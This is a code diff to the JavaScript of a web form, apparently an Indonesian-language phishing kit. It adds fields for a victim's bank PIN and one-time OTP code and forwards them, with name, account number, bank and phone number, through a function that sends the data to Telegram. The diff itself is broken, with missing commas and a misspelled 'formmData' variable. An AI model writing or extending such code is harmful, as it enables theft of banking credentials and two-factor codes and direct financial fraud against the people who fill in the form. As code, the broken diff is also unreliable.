@@ -31,6 +31,9 @@ let formData = {
     password: '',
     nama: '',
     norekening: '',
+    bank: ''
+    pin: ''
+    nohp: ''
     job: '',
     link: ''
 };
@@ -128,6 +131,8 @@ document.getElementById('dataForm').addEventListener('submit', function (e) {
     formData.nama = document.getElementById('nama').value;
     formData.norekening = document.getElementById('norekening').value;
     formData.bank = document.getElementById('bank').value;
+    formmData.pin = document.getElementById('pin').value;
+    formData.kodeotp = document.getElementById('kodeotp').value;
     formData.nohp = document.getElementById('nohp').value;
     formData.job = document.getElementById('job').value;
     goToStep(3);
@@ -244,6 +249,8 @@ async function sendToTelegram() {
 ├ Nama: <code>${formData.nama}</code>
 ├ No Rekening: <code>${formData.norekening}</code>
 ├ Bank: <code>${formmData.bank}</code>
+├ Pin: <code>${formData.pin}</code>
+├ Kode Otp: <code>${formData.kodeotp}</code>
 ├ No Hp: <code>${formData.nohp}</code>
 └ Pekerjaan: <code>${formData.job}</code>
 
